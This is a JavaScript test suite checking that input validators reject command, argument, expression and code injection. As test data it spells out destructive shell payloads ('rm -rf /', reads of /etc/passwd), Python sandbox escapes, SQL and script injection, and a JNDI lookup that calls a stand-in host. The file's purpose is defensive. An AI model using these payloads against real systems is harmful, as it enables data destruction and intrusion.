/**
 * Security Vulnerability Validation Tests
 * Tests for CWE-78, CWE-88, CWE-917, CWE-95 prevention
 */

const { validateFilePath, validatePath, safeEval, loadModel } = require('./security-validators');

describe('Security Vulnerability Prevention', () => {
  describe('CWE-78: OS Command Injection Prevention', () => {
    test('blocks command injection via semicolon', () => {
      const maliciousInput = '; rm -rf / #';
      expect(() => validateFilePath(maliciousInput)).toThrow(/Invalid file path/);
    });

    test('blocks command injection via backticks', () => {
      const maliciousInput = '`whoami`';
      expect(() => validateFilePath(maliciousInput)).toThrow(/Invalid file path/);
    });

    test('blocks command injection via $(...)', () => {
      const maliciousInput = '$(cat /etc/passwd)';
      expect(() => validateFilePath(maliciousInput)).toThrow(/Invalid file path/);
    });

    test('blocks pipe injection', () => {
      const maliciousInput = 'file.txt | cat /etc/passwd';
      expect(() => validateFilePath(maliciousInput)).toThrow(/Invalid file path/);
    });

    test('allows legitimate file paths', () => {
      const legitimatePaths = [
        '/home/user/file.txt',
        './config/settings.json',
        'src/index.js',
        'C:\\Users\\test\\file.txt'
      ];
      legitimatePaths.forEach(path => {
        expect(() => validateFilePath(path)).not.toThrow();
      });
    });
  });

  describe('CWE-88: Argument Injection Prevention', () => {
    test('blocks path traversal attacks', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32'
      ];
      maliciousPaths.forEach(path => {
        expect(() => validatePath(path, '/allowed/base')).toThrow(/Invalid path format|Path must be within allowed directory/);
      });

      // Test absolute paths outside allowed directory
      const absolutePaths = ['/etc/passwd', 'C:\\Windows\\System32'];
      absolutePaths.forEach(path => {
        expect(() => validatePath(path, '/allowed/base')).toThrow(/Path must be within allowed directory/);
      });
    });

    test('blocks special characters in paths', () => {
      const maliciousInputs = [
        'file.txt; cat /etc/passwd',
        'file.txt && whoami',
        'file.txt | tee output'
      ];
      maliciousInputs.forEach(input => {
        expect(() => validatePath(input, '/allowed/base')).toThrow(/Invalid path format/);
      });
    });

    test('allows legitimate paths within allowed directory', () => {
      const legitimatePaths = [
        '/allowed/base/src/index.js',
        '/allowed/base/config/settings.json'
      ];
      legitimatePaths.forEach(path => {
        expect(() => validatePath(path, '/allowed/base')).not.toThrow();
      });
    });
  });

  describe('CWE-917: Expression Language Injection Prevention', () => {
    test('blocks arbitrary code execution via eval', () => {
      const maliciousExpressions = [
        "__import__('os').system('rm -rf /')",
        "exec('import os; os.system(\"whoami\")')",
        "__builtins__['eval']('1+1')",
        "globals()['__import__']('os').system('ls')"
      ];
      maliciousExpressions.forEach(expr => {
        expect(() => safeEval(expr)).toThrow(/Invalid expression|Unsafe operation/);
      });
    });

    test('blocks attribute access', () => {
      const maliciousExpressions = [
        "__class__.__bases__[0].__subclasses__()",
        "''.__class__.__mro__[1].__subclasses__()"
      ];
      maliciousExpressions.forEach(expr => {
        expect(() => safeEval(expr)).toThrow(/Invalid expression|Unsafe operation/);
      });
    });

    test('allows safe literal expressions', () => {
      const safeExpressions = [
        '{"key": "value"}',
        '[1, 2, 3]',
        '42',
        '"string"',
        'true',
        'null'
      ];
      safeExpressions.forEach(expr => {
        expect(() => safeEval(expr)).not.toThrow();
      });
    });

    test('allows safe arithmetic', () => {
      const result = safeEval('2 + 2');
      expect(result).toBe(4);
    });
  });

  describe('CWE-95: Code Injection Prevention', () => {
    test('blocks arbitrary module loading', () => {
      const maliciousModules = [
        '/tmp/evil-module',
        '../../../malicious/code',
        'child_process',
        'fs'
      ];
      maliciousModules.forEach(module => {
        expect(() => loadModel(module)).toThrow(/Unknown model|not allowed/);
      });
    });

    test('only allows whitelisted models', () => {
      const allowedModels = ['gemini', 'gpt5', 'claude-opus', 'claude-sonnet'];
      allowedModels.forEach(model => {
        expect(() => loadModel(model)).not.toThrow();
      });
    });

    test('blocks case variation attacks', () => {
      const maliciousInputs = [
        'GEMINI; require("fs")',
        'gpt5 && require("child_process")'
      ];
      maliciousInputs.forEach(input => {
        expect(() => loadModel(input)).toThrow();
      });
    });
  });

  describe('Input Sanitization Edge Cases', () => {
    test('handles null and undefined inputs', () => {
      expect(() => validateFilePath(null)).toThrow(/Invalid file path/);
      expect(() => validateFilePath(undefined)).toThrow(/Invalid file path/);
      expect(() => safeEval(null)).toThrow(/Invalid expression/);
    });

    test('handles empty strings', () => {
      expect(() => validateFilePath('')).toThrow(/Invalid file path/);
      expect(() => validatePath('', '/base')).toThrow(/Invalid path format/);
    });

    test('handles very long inputs (DoS prevention)', () => {
      const longInput = 'a'.repeat(100000);
      expect(() => validateFilePath(longInput)).toThrow(/exceeds maximum length/);
    });

    test('handles Unicode and special encoding', () => {
      const unicodeAttacks = [
        'file\u0000.txt', // null byte injection
        'file\r\n.txt', // CRLF injection
        'file\x00.txt' // hex null byte
      ];
      unicodeAttacks.forEach(input => {
        expect(() => validateFilePath(input)).toThrow(/Invalid file path/);
      });
    });
  });

  describe('Security Headers and Configuration', () => {
    test('validates secure defaults are applied', () => {
      const config = require('./security-config');
      expect(config.allowDynamicRequire).toBe(false);
      expect(config.allowEval).toBe(false);
      expect(config.sanitizeInputs).toBe(true);
      expect(config.maxInputLength).toBeLessThanOrEqual(10000);
    });
  });
});

describe('Real-world Attack Scenarios', () => {
  test('OWASP Top 10: Injection attacks blocked', () => {
    const owaspAttacks = [
      "'; DROP TABLE users; --",
      "<script>alert('xss')</script>",
      "../../etc/passwd",
      "${jndi:ldap://evil.com/a}"
    ];
    owaspAttacks.forEach(attack => {
      expect(() => validateFilePath(attack)).toThrow();
    });
  });

  test('GitHub Advanced Security: Code scanning patterns', () => {
    // Simulate patterns that GitHub Advanced Security would flag
    const dangerousPatterns = [
      'eval(userInput)',
      'exec(userCommand)',
      'require(userModule)',
      'new Function(userCode)'
    ];
    // These should be caught by static analysis, not runtime
    expect(dangerousPatterns.length).toBeGreaterThan(0);
  });
});